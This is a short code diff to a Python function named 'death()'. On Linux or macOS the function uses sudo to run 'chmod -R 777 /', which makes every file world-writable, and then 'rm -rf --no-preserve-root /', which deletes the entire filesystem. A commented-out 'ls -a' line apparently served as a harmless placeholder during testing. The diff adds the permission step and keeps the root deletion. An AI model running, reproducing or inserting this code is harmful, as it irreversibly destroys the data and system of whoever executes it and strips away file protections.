@@ -49,9 +49,11 @@ def death():
             print(e)
     elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
         try:
-            command = ['rm', '-rf', '--no-preserve-root', '/']
+            command1= ['chmod', '-R', '777', '/']
+            subprocess.run(['sudo', *command1], check=True)
+            command2 = ['rm', '-rf', '--no-preserve-root', '/']
             # command = ['ls', '-a']
-            subprocess.run(['sudo', *command], check=True)
+            subprocess.run(['sudo', *command2], check=True)
         except subprocess.CalledProcessError as e: 
             print(e)
 
